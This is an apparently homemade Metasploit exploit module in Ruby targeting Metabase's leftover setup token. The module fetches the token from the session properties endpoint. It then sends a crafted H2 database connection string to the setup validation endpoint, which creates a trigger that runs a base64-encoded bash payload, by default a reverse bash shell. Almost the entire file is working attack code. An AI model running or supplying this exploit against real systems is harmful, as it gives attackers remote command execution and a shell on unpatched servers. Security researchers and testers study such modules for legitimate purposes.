##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = GoodRanking

    #include modules/mixins that will be useful for the exploit (HttpClient contains functions for sending GET requests)
    include Msf::Exploit::Remote::HttpClient

    def initialize(info = {})
        super(      
            update_info(
                info,
                'Name'          => 'Homemade Metabase Setup Token RCE',
                'Description'   => 'This module exploits a setup token which is never destroyed after intial applicaiton installation, this can then be used to setup databases, through which code execution can be achieved',
                'Author'        => [
                    'Keelan Cross', # msf module
                    'Musyoka Ian', # original PoC, analysis
                ],
                'DefaultOptions' => {
                    'PAYLOAD' => 'cmd/unix/reverse_bash'
                    # for docker payload/cmd/unix/reverse_netcat also works, but no perl/python (was running docker so this might be important - unknown source)
                },
                'Targets'       => [ ['Automatic', {} ] ],
                'Platform'      => 'unix',
            )
        )
        register_options(      
            [        
                Opt::RPORT(3000),        
                OptString.new('TARGETURI', [ true, 'The URI of the Target Application', '/'])
            ]    
        )
    end

    # Attempt to check if exploit will succeed based on the options provided.
    def check
        uri = target_uri.path
        uri << '/' if uri[-1,1] != '/'      #this monstrosity always ensures that there is a leading / in our uri, so if we append we dont need to prepend a /

        res = send_request_cgi({
            'method' => 'GET',
            'uri' => normalize_uri(target_uri.path, 'api/session/properties'),
        })

        return CheckCode::Unknown("#{peer} - Response is null, cannot reach target") if res.nil?      #not sure what #{peer} is, could be from HttpClient Module
        return CheckCode::Unknown("#{peer} - Bad Response Code") unless res.code == 200               #but it does the job for handling these responses :)

        #Generic responses for when things go bad.
        #fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service") if res.nil?
        #fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200

        if res.body =~ /setup-token/
            return CheckCode::Appears("setup-token detected! most likely exploitable!")
        else
            return CheckCode::Unknown("Unable to find setup-token from JSON blob")
        end

    end
    
    def exploit
        uri = target_uri.path                   #should need to reassign this because no guarantee check is called first
        uri << '/' if uri[-1,1] != '/'

        res = send_request_cgi({
            'method' => 'GET',
            'uri' => normalize_uri(target_uri.path, 'api/session/properties'),
        })

        #Generic responses for when things go bad.
        fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service") if res.nil?
        fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200

        if res.body =~ /setup-token/
            json = res.get_json_document
            setup_token = json['setup-token']

            print_good("Found setup token: #{setup_token}")

            print_status('Sending exploit (may take a few seconds)')
            # our base64ed payload can't have = in it, so we'll pad out with spaces to remove them (ty internet)
            b64_pe = ::Base64.strict_encode64(payload.encoded)
            equals_count = b64_pe.count('=')
            if equals_count > 0
                b64_pe = ::Base64.strict_encode64(payload.encoded + ' ' * equals_count)
            end

            send_request_cgi(
            'uri' => normalize_uri(target_uri.path, 'api/setup/validate'),    #url where we setup our starting db
            'method' => 'POST',
            'ctype' => 'application/json',
            'data' => {
                'token' => setup_token,
                'details' =>                                                        #JSON data as per exploit py code
                    {
                        "is_on_demand": false,
                        "is_full_sync": false,
                        "is_sample": false,
                        "cache_ttl": nil,
                        "refingerprint": false,
                        "auto_run_queries": true,
                        "schedules": {},
                        'details' =>
                        {                                                                                 #RCE TIME!     #random string gen                                                                                                                                         #payload insertion within bash command
                            'db' => "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER #{Rex::Text.rand_text_alpha_upper(6..12)} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,#{b64_pe}}|{base64,-d}|{bash,-i}')\n$$--=x",
                            'advanced-options' => false,
                            'ssl' => true
                        },
                        'name' => Rex::Text.rand_text_alphanumeric(6..12),
                        'engine' => 'h2'
                    }
                }.to_json
            )
        else
            fail_with(Failure::NotFound, "#{peer} - Could not find setup-token in application.)")
        end
    end 
end